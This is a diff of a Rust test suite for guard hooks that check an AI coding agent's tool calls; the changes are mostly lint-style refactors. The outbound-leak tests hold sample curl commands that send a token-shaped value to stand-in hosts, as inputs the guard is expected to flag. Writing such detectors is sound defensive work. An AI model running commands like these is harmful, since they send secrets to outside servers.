@@ -83,19 +83,19 @@ fn pace_default(state: &'static str) -> Pace {
     fake_pace(state, 40.0, 50.0)
 }
 
-fn write_pace_cache(cache_dir: &std::path::Path, pace: Option<Pace>) {
+fn write_pace_cache(cache_dir: &Path, pace: Option<Pace>) {
     let path = cache_dir.join("claude-pace.json");
     match pace {
         Some(p) if p.state != "unknown" => {
             let now = now_secs() as i64;
             let idx = ((p.budget / 100.0 * 6.0).round() as i64 - 1).clamp(0, 5);
             let ws = now - idx * 86400;
-            std::fs::create_dir_all(cache_dir).unwrap();
+            fs::create_dir_all(cache_dir).unwrap();
             let body = json!({"updated": now, "seven_day": {"used_percentage": p.used, "resets_at": ws + WEEK}});
-            std::fs::write(path, body.to_string()).unwrap();
+            fs::write(path, body.to_string()).unwrap();
         }
         _ => {
-            let _ = std::fs::remove_file(path);
+            let _ = fs::remove_file(path);
         }
     }
 }
@@ -137,14 +137,14 @@ struct G {
 }
 
 impl G {
-    fn new() -> G {
+    fn new() -> Self {
         let tmp = tempfile::Builder::new().prefix("guard-test-").tempdir().unwrap();
         let dir = tmp.path().to_path_buf();
         // the G6 hand-off must exist on disk: Stop and archive skip a deleted one
         let ho = dir.join("repo/.agents/handoffs/2026-10-14-x.md");
-        std::fs::create_dir_all(ho.parent().unwrap()).unwrap();
-        std::fs::write(&ho, "# Task").unwrap();
-        let g = G { _tmp: tmp, dir, ho: ho.to_string_lossy().into_owned() };
+        fs::create_dir_all(ho.parent().unwrap()).unwrap();
+        fs::write(&ho, "# Task").unwrap();
+        let g = Self { _tmp: tmp, dir, ho: ho.to_string_lossy().into_owned() };
         g.set(""); // the fake pace below assumes the old fixed plan and week
         g
     }
@@ -158,10 +158,10 @@ impl G {
     }
 
     fn write(&self, path: &str, text: &str) {
-        if let Some(p) = std::path::Path::new(path).parent() {
-            std::fs::create_dir_all(p).unwrap();
+        if let Some(p) = Path::new(path).parent() {
+            fs::create_dir_all(p).unwrap();
         }
-        std::fs::write(path, text).unwrap();
+        fs::write(path, text).unwrap();
     }
 
     fn lines(&self, path: &str, recs: &[Value]) {
@@ -483,7 +483,7 @@ fn assert_routed(out: &Option<Value>, ti: &Value, model: &str, effort: Option<&s
     let out = out.as_ref().expect("a routed call");
     assert_eq!(out["hookEventName"], "PreToolUse");
     assert_eq!(out["permissionDecision"], "allow");
-    assert!(!out["additionalContext"].as_str().unwrap_or("").is_empty());
+    assert_ne!(out["additionalContext"].as_str().unwrap_or(""), "");
     let new = &out["updatedInput"];
     assert_eq!(new["model"], model);
     match effort {
@@ -715,7 +715,7 @@ fn test_w4_budget() {
 }
 
 fn fs_read(path: &str) -> String {
-    std::fs::read_to_string(path).unwrap()
+    fs::read_to_string(path).unwrap()
 }
 
 // --- G1 ---
@@ -1048,7 +1048,7 @@ fn test_g5_defaults_by_agent_type() {
         ("general-purpose", 4000),
         ("Explore", 4000),
     ] {
-        let big = (cap as f64 * 1.1) as usize;
+        let big = (f64::from(cap) * 1.1) as usize;
         let res = g.handback_full(json!("x".repeat(big + 1)), None, Some(kind), kind, "pretool", json!({}));
         assert_deny(&res, &format!("the cap is {cap}"));
         let res =
@@ -1418,7 +1418,7 @@ fn test_cap_parallel_calls_race_safely() {
         handles.into_iter().map(|h| h.join().unwrap()).collect()
     });
     let mut codes: Vec<i32> = results.iter().map(|r| r.0).collect();
-    codes.sort();
+    codes.sort_unstable();
     assert_eq!(codes, vec![0, 0, 0, 2, 2, 2]);
 }
 
@@ -1444,8 +1444,14 @@ struct S {
 }
 
 impl S {
-    fn new() -> S {
-        S { mode: Some("default"), pace: None, model: Some("claude-sonnet-5-5"), entry: Some("cli"), extra: json!({}) }
+    fn new() -> Self {
+        Self {
+            mode: Some("default"),
+            pace: None,
+            model: Some("claude-sonnet-5-5"),
+            entry: Some("cli"),
+            extra: json!({}),
+        }
     }
 }
 
@@ -1720,12 +1726,12 @@ impl G {
     }
 
     fn real_dir(&self) -> PathBuf {
-        std::fs::canonicalize(&self.dir).unwrap()
+        fs::canonicalize(&self.dir).unwrap()
     }
 
     fn make_repo(&self, upstream: bool) -> String {
         let work = self.real_dir().join("work");
-        std::fs::create_dir_all(&work).unwrap();
+        fs::create_dir_all(&work).unwrap();
         let work = work.to_string_lossy().into_owned();
         self.git(&work, &["init", "-q"]);
         self.git(&work, &["symbolic-ref", "HEAD", "refs/heads/main"]);
@@ -1734,7 +1740,7 @@ impl G {
         self.git(&work, &["commit", "-q", "-m", "base"]);
         if upstream {
             let bare = self.real_dir().join("origin.git");
-            std::fs::create_dir_all(&bare).unwrap();
+            fs::create_dir_all(&bare).unwrap();
             let bare = bare.to_string_lossy().into_owned();
             self.git(&bare, &["init", "-q", "--bare"]);
             self.git(&work, &["remote", "add", "origin", &bare]);
@@ -1745,7 +1751,7 @@ impl G {
 
     fn write_file(&self, repo: &str, name: &str, text: &str) -> String {
         let p = format!("{repo}/{name}");
-        std::fs::write(&p, text).unwrap();
+        fs::write(&p, text).unwrap();
         p
     }
 
@@ -1885,7 +1891,7 @@ fn test_g10_no_upstream_and_git_failures_are_quiet() {
     let commit = tu("Bash", json!({"command": "git commit -m \"new\""}), "u1");
     assert_allow(&g.g10(&[human("x"), commit, g.say("done")], &repo, json!({})));
     let plain = g.join("plain");
-    std::fs::create_dir_all(&plain).unwrap();
+    fs::create_dir_all(&plain).unwrap();
     assert_allow(&g.g10(&recs, &plain, json!({}))); // not a repo
     assert_allow(&g.g10(&recs, &g.join("missing"), json!({})));
     assert_allow(&g.stop_run(&recs, json!({}))); // no cwd at all
@@ -1898,10 +1904,10 @@ fn test_g10_fails_open_when_git_cannot_start() {
     let p = g.write_file(&repo, "new.txt", "x");
     let path = g.transcript(&[human("x"), tu("Write", json!({"file_path": p}), "u1"), g.say("done")]);
     let data = json!({"transcript_path": path, "cwd": repo});
-    assert!(!g.run("stop", &data).2.is_empty()); // sanity: fires with a working git
+    assert_ne!(g.run("stop", &data).2, ""); // sanity: fires with a working git
     // a git that cannot start: an empty PATH
     let empty = g.join("nopath");
-    std::fs::create_dir_all(&empty).unwrap();
+    fs::create_dir_all(&empty).unwrap();
     assert_eq!(g.run_with("stop", &data, &[("PATH", &empty)]), (0, String::new(), String::new()));
 }
 
@@ -1970,7 +1976,7 @@ fn test_g11_switches_and_missing_transcript() {
 
 // G12 open steps check
 fn plan(kw: Value) -> Value {
-    let n = kw.as_object().map_or(0, |o| o.len());
+    let n = kw.as_object().map_or(0, serde_json::Map::len);
     tu("mcp__ccd_turn__update_plan", kw, &format!("p{n}"))
 }
 
@@ -2111,7 +2117,7 @@ fn test_stop_writes_the_open_steps_for_the_statusline() {
         g.say("Working on it."),
     ];
     assert_deny(&g.stop_run(&open, json!({})), "G12");
-    assert_eq!(std::fs::read_to_string(&file).unwrap(), "2\tRun tests\n");
+    assert_eq!(fs::read_to_string(&file).unwrap(), "2\tRun tests\n");
     // the forced continuation ends with a stop_hook_active Stop: the file follows the new state
     let fewer = [
         human("go"),
@@ -2129,10 +2135,10 @@ fn test_stop_writes_the_open_steps_for_the_statusline() {
         g.say("Waiting."),
     ];
     assert_allow(&g.stop_run(&asked, json!({})));
-    assert_eq!(std::fs::read_to_string(&file).unwrap(), "2\tA\n");
+    assert_eq!(fs::read_to_string(&file).unwrap(), "2\tA\n");
     // a session id keeps only [A-Za-z0-9_-] in the file name
     assert_allow(&g.stop_run(&asked, json!({"session_id": "a/../b c"})));
-    assert_eq!(std::fs::read_to_string(status_file(&g, "abc")).unwrap(), "2\tA\n");
+    assert_eq!(fs::read_to_string(status_file(&g, "abc")).unwrap(), "2\tA\n");
 }
 
 #[cfg(unix)]
@@ -2378,11 +2384,11 @@ impl G {
     fn secret_tree(&self) -> String {
         let repo = self.real_dir().join("dotfiles");
         let zsh = repo.join("home/.config/zsh");
-        std::fs::create_dir_all(&zsh).unwrap();
+        fs::create_dir_all(&zsh).unwrap();
         for name in ["local.zsh", "aliases.zsh"] {
-            std::fs::write(zsh.join(name), "export KEY=1\n").unwrap();
+            fs::write(zsh.join(name), "export KEY=1\n").unwrap();
         }
-        std::fs::create_dir_all(self.dir.join(".config")).unwrap();
+        fs::create_dir_all(self.dir.join(".config")).unwrap();
         symlink(&zsh.to_string_lossy(), &self.join(".config/zsh"));
         repo.to_string_lossy().into_owned()
     }
@@ -2393,7 +2399,7 @@ impl G {
 fn test_g15_read_tool() {
     let g = G::new();
     let zsh = g.join(".config/zsh");
-    std::fs::create_dir_all(&zsh).unwrap();
+    fs::create_dir_all(&zsh).unwrap();
     let target = format!("{zsh}/local.zsh");
     g.write(&target, "export KEY=1\n");
     let link = g.join("link.zsh");
@@ -3171,7 +3177,7 @@ impl G {
     }
 
     fn shadow_log(&self) -> String {
-        std::fs::read_to_string(self.join("cache/dots-guard-shadow.log")).unwrap_or_default()
+        fs::read_to_string(self.join("cache/dots-guard-shadow.log")).unwrap_or_default()
     }
 }
 
@@ -3213,7 +3219,7 @@ fn g16_repo_and_branch_flag_values_are_not_body_text() {
         assert!(is_ask(&g16_cmd(&cmd, dir.path())), "{cmd}");
     }
     let file = dir.path().join("b.md");
-    std::fs::write(&file, format!("about {WORD}")).unwrap();
+    fs::write(&file, format!("about {WORD}")).unwrap();
     let cmd = format!("gh pr create -R me/x --title t --body-file {}", file.display());
     assert!(is_ask(&g16_cmd(&cmd, dir.path())), "{cmd}");
 }
@@ -3262,8 +3268,8 @@ fn g16_secret_shape_asks() {
 fn g16_unreadable_body_file_asks() {
     let dir = tempfile::tempdir().unwrap();
     let d = dir.path();
-    std::fs::create_dir(d.join("adir")).unwrap();
-    std::fs::write(d.join("big.md"), vec![b'a'; 1_100_000]).unwrap();
+    fs::create_dir(d.join("adir")).unwrap();
+    fs::write(d.join("big.md"), vec![b'a'; 1_100_000]).unwrap();
     for cmd in [
         "gh pr create --body-file missing.md",
         "gh pr create --body-file adir",
@@ -3279,11 +3285,11 @@ fn g16_unreadable_body_file_asks() {
 #[test]
 fn g16_clean_long_body_file_allows() {
     let dir = tempfile::tempdir().unwrap();
-    std::fs::write(dir.path().join("body.md"), "a plain sentence about nothing in particular. ".repeat(110)).unwrap();
-    assert!(std::fs::metadata(dir.path().join("body.md")).unwrap().len() >= 5000);
+    fs::write(dir.path().join("body.md"), "a plain sentence about nothing in particular. ".repeat(110)).unwrap();
+    assert!(fs::metadata(dir.path().join("body.md")).unwrap().len() >= 5000);
     let words: Vec<String> = ["zebrafish", "quincyzed", "alpha-proj", "beta-proj", "gamma", "quincy@example.test"]
         .iter()
-        .map(|s| s.to_string())
+        .map(ToString::to_string)
         .collect();
     let input = bash_in("gh pr create --title t --body-file body.md");
     assert_eq!(gc::g16_outbound("Bash", &input, dir.path(), &words), Verdict::Allow);
@@ -3292,11 +3298,11 @@ fn g16_clean_long_body_file_allows() {
 #[test]
 fn g16_body_file_with_a_word_asks_relative_to_cwd() {
     let dir = tempfile::tempdir().unwrap();
-    std::fs::create_dir(dir.path().join("sub")).unwrap();
-    std::fs::write(dir.path().join("sub/b.md"), format!("hello {WORD}")).unwrap();
+    fs::create_dir(dir.path().join("sub")).unwrap();
+    fs::write(dir.path().join("sub/b.md"), format!("hello {WORD}")).unwrap();
     assert!(is_ask(&g16_cmd("gh pr create --body-file sub/b.md", dir.path())));
     assert!(is_ask(&g16_cmd("cd sub && gh pr create -F b.md", dir.path())));
-    std::fs::write(dir.path().join("sub/b.md"), "hello").unwrap();
+    fs::write(dir.path().join("sub/b.md"), "hello").unwrap();
     assert_eq!(g16_cmd("gh pr create --body-file sub/b.md", dir.path()), Verdict::Allow);
 }
 
@@ -3394,7 +3400,7 @@ fn g16_is_core_and_has_an_off_switch() {
 fn g16_command_shapes_ask() {
     let dir = tempfile::tempdir().unwrap();
     let d = dir.path();
-    std::fs::write(d.join("f.md"), format!("hello {WORD}")).unwrap();
+    fs::write(d.join("f.md"), format!("hello {WORD}")).unwrap();
     let w = WORD;
     let cases: Vec<String> = vec![
         format!("/usr/bin/gh pr create --body \"{w}\""),
@@ -3502,13 +3508,12 @@ fn g16_a_heredoc_elsewhere_in_the_command_is_scanned_when_it_sends() {
 fn private_words_sources() {
     let home = tempfile::tempdir().unwrap();
     let work = tempfile::tempdir().unwrap();
-    std::fs::create_dir_all(home.path().join(".config/dotfiles")).unwrap();
-    std::fs::write(
+    fs::create_dir_all(home.path().join(".config/dotfiles")).unwrap();
+    fs::write(
         home.path().join(".config/dotfiles/settings"),
         "PRIVATE_PROJECTS=\"alpha-proj, Beta-Proj\"\nPRIVATE_WORDS=\"gamma delta\"\nGIT_NAME=\"Quincy Zed\"\nGIT_EMAIL=\"quincy@example.test\"\n",
     ).unwrap();
-    std::fs::write(home.path().join(".gitconfig"), "[user]\n\tname = Dana Quill\n\temail = dana@example.test\n")
-        .unwrap();
+    fs::write(home.path().join(".gitconfig"), "[user]\n\tname = Dana Quill\n\temail = dana@example.test\n").unwrap();
     let words = gc::private_words_at(home.path(), Some(work.path()));
     for want in [
         "alpha-proj",
@@ -3545,7 +3550,7 @@ fn private_words_sources() {
     assert!(words.iter().any(|w| w == "dana quill"), "{words:?}");
     // an empty world has no words
     let empty = tempfile::tempdir().unwrap();
-    assert!(gc::private_words_at(empty.path(), Some(empty.path())).is_empty());
+    assert_eq!(gc::private_words_at(empty.path(), Some(empty.path())), [] as [String; 0]);
 }
 
 // --- Task 11: G17 attribution check ---
@@ -3713,8 +3718,8 @@ fn g17_library_verdicts() {
     assert_eq!(g17_cmd(&format!("echo \"{a}\""), dir.path()), Verdict::Allow);
     assert_eq!(g17_cmd("", dir.path()), Verdict::Allow);
     // a message file read relative to the cwd, and relative to `-C`
-    std::fs::create_dir(dir.path().join("sub")).unwrap();
-    std::fs::write(dir.path().join("sub/m.txt"), &a).unwrap();
+    fs::create_dir(dir.path().join("sub")).unwrap();
+    fs::write(dir.path().join("sub/m.txt"), &a).unwrap();
     assert!(is_deny(&g17_cmd("git -C sub commit -F m.txt", dir.path())));
     assert!(is_deny(&g17_cmd("cd sub && git commit -F m.txt", dir.path())));
     assert_eq!(g17_cmd("git commit -F m.txt && true", &dir.path().join("sub").join("x")), Verdict::Allow);
@@ -3839,8 +3844,8 @@ fn g16_curl_and_wget_urls_and_config_files() {
     let dir = tempfile::tempdir().unwrap();
     let d = dir.path();
     let (w, sk) = (WORD, gh_token());
-    std::fs::write(d.join("cfg.txt"), format!("data = \"{w}\"\n")).unwrap();
-    std::fs::write(d.join("clean.txt"), "silent\n").unwrap();
+    fs::write(d.join("cfg.txt"), format!("data = \"{w}\"\n")).unwrap();
+    fs::write(d.join("clean.txt"), "silent\n").unwrap();
     for cmd in [
         format!("curl 'https://x.y/?k={sk}'"),
         format!("curl -d x 'https://h.io/?k={sk}'"),
@@ -3880,8 +3885,8 @@ fn g16_more_gh_verbs() {
     let dir = tempfile::tempdir().unwrap();
     let d = dir.path();
     let w = WORD;
-    std::fs::write(d.join("body.txt"), format!("about {w}")).unwrap();
-    std::fs::write(d.join("clean.txt"), "silent").unwrap();
+    fs::write(d.join("body.txt"), format!("about {w}")).unwrap();
+    fs::write(d.join("clean.txt"), "silent").unwrap();
     for cmd in [
         format!("gh repo create x --description {w}"),
         format!("gh repo create x -d {w}"),
